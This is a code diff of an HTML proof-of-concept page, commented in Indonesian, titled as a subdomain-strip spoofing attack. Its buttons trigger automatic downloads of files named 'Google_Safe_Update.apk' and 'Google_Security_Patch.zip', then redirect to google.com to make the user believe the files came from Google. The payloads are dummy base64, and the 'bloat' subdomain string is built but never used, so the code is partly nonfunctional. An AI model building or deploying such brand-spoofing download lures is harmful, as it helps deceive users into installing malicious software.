@@ -2,54 +2,60 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>V398: SUBDOMAIN_STRIP_SPOOF</title>
 </head>
 <body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:100px;">
 
     <h1 style="color:#0ff; text-shadow:0 0 15px #0ff;">[!] V398: SUBDOMAIN_STRIP_SPOOF</h1>
+    <div id="status" style="border:1px solid #333; padding:15px; margin:20px;">> STANDBY: READY FOR BLOAT...</div>
     
-    <div id="status" style="border:1px solid #333; padding:15px; margin:20px; color:#aaa;">
-        > STANDBY: READY FOR SUBDOMAIN BLOAT...
+    <div style="display: flex; justify-content: center; gap: 20px;">
+        <button type="button" id="apkBtn" style="padding:25px; background:#111; color:#0ff; border:2px solid #0ff; cursor:pointer; font-weight:bold;">
+            EXECUTE_APK_SPOOF
+        </button>
+
+        <button type="button" id="zipBtn" style="padding:25px; background:#111; color:#f0f; border:2px solid #f0f; cursor:pointer; font-weight:bold;">
+            EXECUTE_ZIP_SPOOF
+        </button>
     </div>
-    
-    <button type="button" id="strikeBtn" style="padding:25px; background:#111; color:#0ff; border:2px solid #0ff; cursor:pointer; font-weight:bold; text-transform:uppercase;">
-        EXECUTE_SPOOF_APK
-    </button>
 
-    <script>
-        document.getElementById('strikeBtn').addEventListener('click', function() {
-            // 1. THE BLOAT LOGIC
-            // Membuat subdomain yang sangat panjang untuk memicu middle-truncation pada UI Browser
-            const host = "google.com";
-            const padding = ".https://google.com";
-            const longSub = host + padding.repeat(10); 
-            
-            // 2. THE PAYLOAD (.APK)
-            // Menggunakan MIME Type APK agar browser mengenalinya sebagai installer
-            const payload = `data:application/vnd.https://google.com;base64,ZXN0dGVzdGVzdHRlc3Q=`;
-            const filename = "Google_Safe_Update.apk";
+<script>
+    function triggerDownload(type) {
+        // 1. THE BLOAT LOGIC
+        const host = "google.com";
+        const padding = ".https://google.com";
+        const longSub = host + padding.repeat(10); 
+        
+        let payload, filename;
 
-            // 3. TRIGGER DOWNLOAD
-            const a = document.createElement('a');
-            a.href = payload;
-            a.download = filename;
-            document.body.appendChild(a);
-            
-            // Eksekusi klik untuk memicu dialog download
-            a.click();
-            
-            // Cleanup & Redirect
-            setTimeout(() => {
-                document.body.removeChild(a);
-                // Redirect ke situs asli untuk memperkuat manipulasi origin (UX Spoofing)
-                window.location.replace("https://www.google.com");
-            }, 150);
+        if (type === 'apk') {
+            // MIME Type untuk Android Package
+            payload = `data:application/vnd.android.package-archive;base64,ZXN0dGVzdGVzdHRlc3Q=`;
+            filename = "Google_Safe_Update.apk";
+        } else {
+            // MIME Type untuk ZIP Archive
+            payload = `data:application/zip;base64,UEsDBBQAAAAIAAAA... (base64 zip dummy)`;
+            filename = "Google_Security_Patch.zip";
+        }
 
-            document.getElementById('status').innerText = "> STRIKE_SENT: APK DOWNLOAD TRIGGERED";
-            document.getElementById('status').style.color = "#0f0";
-        });
-    </script>
+        // 3. TRIGGER DOWNLOAD
+        const a = document.createElement('a');
+        a.href = payload;
+        a.download = filename;
+        document.body.appendChild(a);
+        a.click();
+        
+        setTimeout(() => {
+            document.body.removeChild(a);
+            // Redirect ke origin asli untuk meyakinkan user
+            window.location.replace("https://www.google.com");
+        }, 150);
 
+        document.getElementById('status').innerText = `> STRIKE_SENT: ${filename}`;
+    }
+
+    document.getElementById('apkBtn').addEventListener('click', () => triggerDownload('apk'));
+    document.getElementById('zipBtn').addEventListener('click', () => triggerDownload('zip'));
+</script>
 </body>
 </html>
